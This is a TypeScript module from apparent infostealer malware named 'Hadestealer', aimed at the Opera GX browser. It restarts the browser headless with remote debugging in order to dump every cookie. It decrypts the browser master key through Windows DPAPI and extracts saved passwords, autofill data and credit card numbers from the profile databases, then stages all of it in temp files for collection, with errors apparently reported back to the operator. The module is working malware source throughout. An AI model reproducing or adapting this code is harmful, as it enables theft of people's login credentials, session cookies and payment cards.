import fs from 'fs';
import path from 'path';
import os from 'os';
import { spawn } from 'child_process';
import axios from 'axios';
import WebSocket from 'ws';
import sqlite3 from 'sqlite3';
import { configsOpera, operaGXPath } from '../config/constants';
import { decryptAESGCM } from '../core/crypto';
import { sleep } from '../core/helpers';
import { killOpera } from '../utils/process';
import { Dpapi } from 'datavault-win';
import { globalMasterKeyCache } from './data';
import { sendGenericMessage } from '../api/sender';

export function browserExistsOpera(browser: string): boolean {
    return fs.existsSync(configsOpera[browser].bin);
}
export async function startBrowserOpera(browser: string): Promise<{ browserProcess: any; randomPort: number } | undefined> {
    const config = configsOpera[browser];
    if (!config) return;

    const randomPort = Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
    const command = `${process.env.LOCALAPPDATA}\\Programs\\Opera GX\\opera.exe`;
    const args = [
        `--remote-debugging-port=${randomPort}`,
        `--user-data-dir=${process.env.APPDATA}\\Opera Software\\Opera GX Stable`,
        '--no-sandbox',
        '--headless'
    ];
    const browserProcess = spawn(command, args, { shell: false });

    browserProcess.stdout.on('data', (data: Buffer) => {
    });

    browserProcess.stderr.on('data', (data: Buffer) => {
    });

    browserProcess.on('close', (code: number) => {
    });

    await sleep(5000);
    return { browserProcess, randomPort };
}

export async function getDebugWsUrlOpera(port: number): Promise<string | null> {
    const url = `http://127.0.0.1:${port}/json`;
    let retries = 5;
    while (retries > 0) {
        try {
            const response = await axios.get(url);
            const data = response.data;
            if (data && data.length > 0) {
                return data[0]?.webSocketDebuggerUrl || null;
            }
        } catch (error) {
            await sleep(2000);
            retries--;
        }
    }
    return null;
}

export async function saveCookiesToFileOpera(cookies: any[]): Promise<string> {
    const outDir = path.join(os.tmpdir(), 'Hadestealer', "All", 'Opera GX');
    fs.mkdirSync(outDir, { recursive: true });
    const filePath = path.join(outDir, 'OperaGX-Cookies.txt');

    const cookieText = cookies.map(cookie =>
        `${cookie.domain}\tTRUE\t${cookie.path || '/'}\tFALSE\t${cookie.expires || '2597573456'}\t${cookie.name}\t${cookie.value}`
    ).join('\n');

    fs.writeFileSync(filePath, cookieText);
    return filePath;
}

export async function getCookiesOpera(wsUrl: string): Promise<any[]> {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(wsUrl);
        ws.on('open', () => {
            ws.send(JSON.stringify({ method: 'Network.getAllCookies', id: 1 }));
        });

        ws.on('message', (data: WebSocket.Data) => {
            const response = JSON.parse(data.toString());
            if (response.id === 1 && response.result) {
                resolve(response.result.cookies);
                ws.close();
            }
        });
        ws.on('error', (error: Error) => {
            reject(error);
        });
    });
}

export async function processBrowserOpera(browser: string): Promise<void> {
    if (!browserExistsOpera(browser)) {
        return;
    }

    const result = await startBrowserOpera(browser);
    if (!result) return;

    const { browserProcess, randomPort } = result;
    const wsUrl = await getDebugWsUrlOpera(randomPort);

    if (!wsUrl) {
        browserProcess.kill();
        return;
    }

    try {
        const cookies = await getCookiesOpera(wsUrl);
        if (cookies && cookies.length > 0) {
            await saveCookiesToFileOpera(cookies);
        } else {
        }
    } catch (error) {
    } finally {
        browserProcess.kill();
    }
}

export async function startOpera(): Promise<void> {
    const browsers = ["operagx"];
    for (const browser of browsers) {
        await processBrowserOpera(browser);
    }
}

export async function opera(): Promise<void> {
    killOpera();
    await sleep(2000);
    await startOpera();
    await sleep(1000);
    killOpera();
    await sleep(1000);
}

async function extractDB(dbPath: string, table: string, fields: string[]): Promise<any[]> {
    return new Promise(r => {
        if (!fs.existsSync(dbPath)) {
            return r([]);
        }
        const tmp = path.join(os.tmpdir(), `tmp_${Math.random().toString(36).slice(2)}.db`);
        try {
            fs.copyFileSync(dbPath, tmp);
        } catch (e) {
            return r([]);
        }
        const db = new sqlite3.Database(tmp);
        const results: any[] = [];
        db.each(`SELECT ${fields.join(',')} FROM ${table}`, (e, row) => {
            if (e) {
                return;
            }
            results.push(row);
        }, () => {
            db.close();
            try { fs.unlinkSync(tmp); } catch { }
            r(results);
        });
    });
}

export async function Operapass(): Promise<void> {
    try {
        if (!fs.existsSync(operaGXPath)) return;

        const localStatePath = path.join(operaGXPath, 'Local State');
        if (!fs.existsSync(localStatePath)) return;

        const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        if (!localState?.os_crypt?.encrypted_key) return;

        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);

        let masterKey: Buffer;
        try {

            masterKey = Dpapi.unprotectData(encryptedKey, null, 'CurrentUser') as Buffer<ArrayBufferLike>;
        } catch (e) {

            const cachedKeyHex = globalMasterKeyCache ? globalMasterKeyCache['Opera GX Stable'] : null;

            if (cachedKeyHex) {
                masterKey = Buffer.from(cachedKeyHex, 'hex');
            } else {
                return;
            }
        }

        const profiles = fs.readdirSync(operaGXPath, { withFileTypes: true })
            .filter(d => d.isDirectory() && (d.name === 'Default' || d.name.startsWith('Profile')))
            .map(d => path.join(operaGXPath, d.name));

        if (profiles.length === 0) {
            profiles.push(operaGXPath);
        }

        const passwords: string[] = [];
        const autofills: string[] = [];
        const creditcards: string[] = [];

        for (const p of profiles) {
            const loginDB = path.join(p, 'Login Data');
            const webDB = path.join(p, 'Web Data');

            const logins = await extractDB(loginDB, 'logins', ['origin_url', 'username_value', 'password_value']);
            for (const { origin_url, username_value, password_value } of logins) {
                if (!username_value || !password_value) continue;
                const dec = decryptAESGCM(password_value, masterKey);
                if (dec) passwords.push(`${origin_url} | ${username_value} | ${dec}`);
            }

            const autofillRows = await extractDB(webDB, 'autofill_profiles', ['name_value', 'value']);
            autofillRows.forEach(({ name_value, value }) => {
                if (name_value && value) autofills.push(`${name_value} | ${value}`);
            });
            const creditCards = await extractDB(webDB, 'credit_cards', ['name_on_card', 'expiration_month', 'expiration_year', 'card_number_encrypted']);
            for (const card of creditCards) {
                const cardNumber = decryptAESGCM(card.card_number_encrypted, masterKey);
                if (cardNumber) {
                    const cvvInfo = "Browser not supported or CVV not stored";
                    creditcards.push(`Holder: ${card.name_on_card} | Number: ${cardNumber} | Expiry: ${card.expiration_month}/${card.expiration_year} | CVV: ${cvvInfo}`);
                }
            }
        }

        if (!passwords.length && !autofills.length) return;

        const outDir = path.join(os.tmpdir(), 'Hadestealer', "All", 'Opera GX');
        const allCreditFilePath = path.join(outDir, '..', "..", 'allCreditData.txt');
        fs.mkdirSync(outDir, { recursive: true });

        if (passwords.length) {
            fs.writeFileSync(path.join(outDir, 'passwords.txt'), passwords.join('\n'), 'utf8');
        }
        if (autofills.length) {
            fs.writeFileSync(path.join(outDir, 'autofills.txt'), autofills.join('\n'), 'utf8');
        }
        if (creditcards.length) {
            const dataToAppend = `${creditcards.join('\n')}\n\n`;
            fs.appendFileSync(allCreditFilePath, dataToAppend, 'utf8');
        }

    } catch (e) {
        sendGenericMessage(`${e}`)

    }
}
